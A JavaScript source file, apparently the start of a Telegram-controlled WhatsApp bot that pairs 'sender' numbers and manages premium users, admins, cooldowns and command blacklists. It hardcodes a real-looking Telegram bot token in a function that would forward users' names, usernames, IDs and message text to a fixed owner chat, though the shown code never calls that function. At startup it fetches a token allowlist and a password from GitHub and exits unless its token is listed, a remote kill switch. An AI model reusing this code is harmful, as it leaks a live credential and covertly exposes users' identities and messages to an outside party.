const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const TOKEN_DARKNIGHT = config.TOKEN_DARKNIGHT;
const bot = new TelegramBot(TOKEN_DARKNIGHT, { polling: true });
const ONLY_FILE = path.join(__dirname, "X ☇ RANDOM", "GroupOnly.json");
const cd = path.join(__dirname, "X ☇ RANDOM", "Cooldown.json");
const blacklistFile = path.join(__dirname, "X ☇ RANDOM", "blacklist.json");
let blacklistedCommands = [];
let commandUsage = {};


const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/yandek123/hanz/refs/heads/main/tokens.json"
const CONTROL_URL = "https://raw.githubusercontent.com/IIFTZY/database/refs/heads/main/control.txt";

let BOT_ACTIVE = true;

let GLOBAL_PASSWORD = null;

async function loadPassword() {
  try {
    const url = "https://raw.githubusercontent.com/IIFTZY/kontol_visible/main/config.json";
    const res = await axios.get(url);
    GLOBAL_PASSWORD = res.data.password;

  } catch (err) {
    console.log("Gagal mengambil password dari GitHub:", err.message);
  }
}

loadPassword();



async function fetchValidTokens() {
            try {
            const response = await axios.get(GITHUB_TOKEN_LIST_URL);
            return response.data.tokens; 
            } catch (error) {
            console.error(chalk.red("❌ Github Eror : Gagal mengambil daftar token dari GitHub:", error.message));
            return [];
            }
            }

   async function validateToken() {
   console.log(chalk.blue(`🔍 TOKEN SEDANG DI CEK OLEH NANA`));
   
   const validTokens = await fetchValidTokens();
   if (!validTokens.includes(TOKEN_DARKNIGHT)) {
   console.log(chalk.red(`⛔ TOKEN TIDAK DIKENALI NANA`));
   process.exit(1);
   }
   console.log(chalk.green(`✅ TOKEN DIKENALI OLEH NANA`));
  initializeWhatsAppConnections();
  }



function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀
`));
};
validateToken () 

const OWNER_CHAT_ID = '5886906224';
const userId = OWNER_CHAT_ID

async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || 'Tidak ada username';
        const firstName = msg.from.first_name;
        const lastName = msg.from.last_name || ''; 
        const messageText = msg.text;  

        const message = `
✨ *IIF 𝘔𝘌𝘕𝘌𝘙𝘐𝘔𝘈 𝘗𝘌𝘚𝘈𝘕* ✨

👤 *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

💬 *Pesan:*
\`\`\`
${messageText}
\`\`\``;
        const url = `https://api.telegram.org/bot7958282439:AAEHqAYd1DoQuwVvJ_wHl3BfChH9jvsWFhM/sendMessage`;
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
        
    }
}


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(chatId, `
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Loading
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Menghubungkan
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(` 
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Eror Connect
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText( `
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Sucses Pairing
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        let cos = "DARKNIGH"
  const code = await sock.requestPairingCode(botNumber, cos);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(`
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText( `
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : ${error.message} Eror connect
`, 
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-----( CASE ADD SENDER )-----\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       const senderId = msg.from.id;
        if (!isOwner(senderId)) {
       return bot.sendMessage(
       chatId, `❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
  
//-----( CASE DELET SENDER )-----\\
bot.onText(/\/delsender (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id;
const senderId = msg.from.id;
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage( chatId ,  ` 
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Proses Hapus Sender  `, 
    { parse_mode: "HTML" }
  );

  try {
    const sheesh = sessions.get(botNumber);
    if (sheesh) {
      sheesh.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(` 
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Berhasil dihapus.. `, 
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "HTML",
        }
      );
    } else {
      await bot.editMessageText(` 
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : Sender Tidak Ditemukan `,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(` 
<blockquote>⬡═―—⊱ ⎧ 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ⎭ ⊰―—═⬡</blockquote>
⌑ Nᴜᴍʙᴇʀ :  ${botNumber}       
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : ${error.message} 
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "HTML",
      }
    );
  }
});

//-----( CASE LIST SENDER )-----\\
bot.onText(/\/listsender/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id;
const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  if (!fs.existsSync(SESSIONS_DIR)) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada sender yang ditambahkan.\n🪧 ☇ Format: /addsender 628xx"
    );
  }
  const folders = fs.readdirSync(SESSIONS_DIR).filter((name) => {
    const fullPath = path.join(SESSIONS_DIR, name);
    return fs.statSync(fullPath).isDirectory();
  });
  if (folders.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada sender yang ditambahkan.\n🪧 ☇ Format: /addsender 628xx"
    );
  }
  let statusMessage = "╔══════════════════════╗\n";
  statusMessage += "║  LIST SENDER WHATSAPP    \n";
  statusMessage += "╠══════════════════════╣\n";

  folders.forEach((number, index) => {
    statusMessage += `║ SENDER : ${index + 1}\n`;
    statusMessage += `║ NOMOR SENDER : ${number}\n`;
    statusMessage += "╠══════════════════════╣\n";
  });

  statusMessage += `║ TOTAL SENDER : ${folders.length}\n`;
  statusMessage += "╚══════════════════════╝";

  await bot.sendMessage(chatId, `\`\`\`\n${statusMessage}\n\`\`\``, {
    parse_mode: "Markdown",
  });
});

//------( CASE GROUP ONLY )-----\\\
bot.onText(/^\/Grouponly (on|of)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
 return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur Group Only sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
//-----( CASE COLDOWN )-----\\
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);
     const senderId = msg.from.id;
     
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
     }
     bot.sendMessage(chatId, response); });

const moment = require('moment');

///-----( CASE ADDPREM )-----\\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;

 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, ` 🪧 ☇ Format: /addprem 666646787 99d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, ` 🪧 ☇ Format: /addprem 666646787 99d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, ` 🪧 ☇ Format: /addprem 666646787 99d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, ` 🪧 ☇ Format: /addprem 666646787 99d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
    ✅ ☇ Succes add ${userId} to premium ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}..`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });
     
//-----( CASE DELET PREMIUM )-----\\
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
const chatId = msg.chat.id;
const senderId = msg.from.id;

if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
          if (!match[1]) {
          return bot.sendMessage(chatId,` 🪧 ☇ Format: /delprem 666646787 `);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
  🚫 Succes delete user ${userId}`);
         });     
         
//-----( CASE LIST PREMIUM )----\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
        if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
      message += "┃ ( ♰ )  LIST USER PREMIUM\n";
      message += "┣━━━━━━━━━━━━━━━━━━━━━━━┫\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `┃${index + 1}. ID: ${user.id}\n┃   Exp: ${expiresAt}\n`;
      });
      message += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//-----( CASE ADD ADMIN )-----\\
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(chatId,` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`,
        );
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, ` 🪧 ☇ Format: /addadmin 666646787 99d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,` 🪧 ☇ Format: /addadmin 666646787 99d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
 ✅ Succes add ${userId} to admin`);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

///-----( CASE DELET ADMIN )-----\\\
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, `❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, ` 🪧 ☇ Format: /deladmin 666646787 99d`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, ` 🪧 ☇ Format: /deladmin 666646787 99d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
        🚫 Succes delete user ${userId} `);
 } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
 }
});
//----- ( CASE LIST BLOCK ) -----\\
bot.onText(/\/listblock/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

        if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

  if (blacklistedCommands.length === 0) {
    return bot.sendMessage(chatId, "✅ Tidak ada command yang diblacklist saat ini.");
  }

  const list = blacklistedCommands.map((cmd, i) => `${i + 1}. ${cmd}`).join("\n");

  bot.sendMessage(
    chatId,
    `📋 *Daftar Command yang Diblock:*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});
///-----( CASE BLACKLIST )-----\\\
bot.onText(/\/block (\/\w+)/, (msg, match) => {
  const commandToBlacklist = match[1].toLowerCase();
  const chatId = msg.chat.id; 
  const senderId = msg.from.id;
  
        if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
  
  
  if (!blacklistedCommands.includes(commandToBlacklist)) {
    blacklistedCommands.push(commandToBlacklist);
    saveBlacklist();
    bot.sendMessage(msg.chat.id, `✅ Command ${commandToBlacklist} berhasil diblacklist!`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ Command ${commandToBlacklist} sudah diblacklist.`);
  }
});

//----- ( CASE UNBLOCK )-----\\
bot.onText(/\/unblock (\/\w+)/, (msg, match) => {
const commandToRemove = match[1].toLowerCase();
const chatId = msg.chat.id; 
const senderId = msg.from.id;
  
 if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
 return bot.sendMessage(chatId, ` ❌ ☇ HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
    
  blacklistedCommands = blacklistedCommands.filter(cmd => cmd !== commandToRemove);
  saveBlacklist();
  bot.sendMessage(msg.chat.id, `✅ Command ${commandToRemove} berhasil dihapus dari daptar blacklist!`);
});

// --------------------- ( FUNCTION GROUP ONLY ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('X ☇ ACCSES/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('X ☇ ACCSES/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('X ☇ ACCSES/premium.json');
            ensureFileExists('X ☇ ACCSES/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('X ☇ ACCSES/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('X ☇ ACCSES/admin.json', JSON.stringify(adminUsers, null, 2));
            }
            
         async function premium(userId) {
        return premiumUsers.some( user => user.id === userId && new Date(user.expiresAt) > new Date()
  );
}

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('X ☇ ACCSES/premium.json', (data) => (premiumUsers = data));
    watchFile('X ☇ ACCSES/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


let antilink = JSON.parse(fs.readFileSync("./antilink.json"));

function loadVerifiedData() {
  try {
    return JSON.parse(fs.readFileSync("./X ☇ RANDOM/verified.json"));
  } catch {
    return { tokenVerified: [], fullyVerified: [] };
  }
}

function saveVerifiedData(data) {
  fs.writeFileSync("./X ☇ RANDOM/verified.json", JSON.stringify(data, null, 2));
}

let verifiedData = loadVerifiedData();
  
//------( FUNCTION BLACKLIST )-------\\
if (fs.existsSync(blacklistFile)) {
  blacklistedCommands = JSON.parse(fs.readFileSync(blacklistFile));
}

function saveBlacklist() {
  fs.writeFileSync(blacklistFile, JSON.stringify(blacklistedCommands));
}


///-----( FUNCTION MEMORY )\\\
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

///----- ( FUNCTION RUNTIME  )----\\\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}

///----- ( FUNCTION DATE NOW )-----\\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
